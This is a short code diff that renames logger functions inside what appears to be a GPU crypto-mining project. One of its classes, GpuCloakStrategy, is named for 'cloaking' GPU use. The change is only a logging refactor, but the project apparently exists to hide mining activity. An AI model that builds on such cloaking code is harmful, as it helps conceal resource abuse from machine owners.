@@ -17,13 +17,13 @@ from pathlib import Path
 from .utils import MiningProcess
 
 # ✅ UNIFIED LOGGING: Use centralized logging system
-from .module_loggers import get_cloak_strategies_logger
+from .module_loggers import get_gpu_cloaking_logger
 
 # ✅ ERROR MANAGEMENT: Use centralized error handling system
 from .error_management import get_error_reporter, ErrorCode, ErrorSeverity, report_error
 
 # ✅ STANDARDIZED: Get unified logger instance (khớp hierarchy)
-cloak_logger = get_cloak_strategies_logger()
+cloak_logger = get_gpu_cloaking_logger()
 
 # ✅ ERROR REPORTER: Get centralized error reporter instance
 error_reporter = get_error_reporter()
@@ -517,10 +517,10 @@ class GpuCloakStrategy(CloakStrategy):
             
             # Import with circular import protection
             from mining_environment.scripts.resource_control import GPUResourceManager as _GPUResourceManager
-            from mining_environment.scripts.module_loggers import get_cloak_strategies_logger
+            from mining_environment.scripts.module_loggers import get_gpu_cloaking_logger
 
             # Create dedicated logger for fallback manager
-            fallback_logger = get_cloak_strategies_logger()
+            fallback_logger = get_gpu_cloaking_logger()
             
             # Create GPU manager with current config
             gpu_manager = _GPUResourceManager(config, fallback_logger)
